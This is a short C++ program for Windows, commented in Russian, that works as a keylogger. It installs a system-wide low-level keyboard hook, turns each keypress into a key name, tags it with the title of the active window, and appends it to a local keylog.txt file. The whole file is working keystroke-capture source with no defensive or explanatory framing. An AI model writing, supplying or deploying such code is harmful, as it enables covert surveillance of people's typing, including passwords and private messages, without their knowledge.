#include <windows.h>
#include <fstream>
#include <string>
#include <map>

std::ofstream logFile("keylog.txt", std::ios::app);

// Функция для преобразования кода клавиши в строку
std::string getKeyName(int vkCode) {
    switch (vkCode) {
    case VK_BACK: return "[BACKSPACE]";
    case VK_TAB: return "[TAB]";
    case VK_RETURN: return "[ENTER]";
    case VK_SHIFT: return "[SHIFT]";
    case VK_CONTROL: return "[CTRL]";
    case VK_MENU: return "[ALT]";
    case VK_ESCAPE: return "[ESC]";
    case VK_SPACE: return "[SPACE]";
    case VK_LEFT: return "[LEFT ARROW]";
    case VK_RIGHT: return "[RIGHT ARROW]";
    case VK_UP: return "[UP ARROW]";
    case VK_DOWN: return "[DOWN ARROW]";
    default:
        if (vkCode >= 0x30 && vkCode <= 0x5A) { // 0-9, A-Z
            return std::string(1, static_cast<char>(vkCode));
        }
        return "[UNKNOWN]";
    }
}

// Функция для получения названия активного окна
std::string getActiveWindowTitle() {
    HWND hwnd = GetForegroundWindow();
    char title[256];
    GetWindowText(hwnd, title, sizeof(title));
    return std::string(title);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN) {
            std::string keyName = getKeyName(pKeyBoard->vkCode);
            std::string windowTitle = getActiveWindowTitle();
            logFile << "Key Pressed: " << keyName << " in Window: " << windowTitle << std::endl;
            logFile.flush(); // Сбрасываем буфер
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    // Устанавливаем перехватчик клавиатуры
    HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hhkLowLevelKybd == NULL) {
        return 1; // Ошибка установки перехватчика
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hhkLowLevelKybd);
    logFile.close();
    return 0;
}

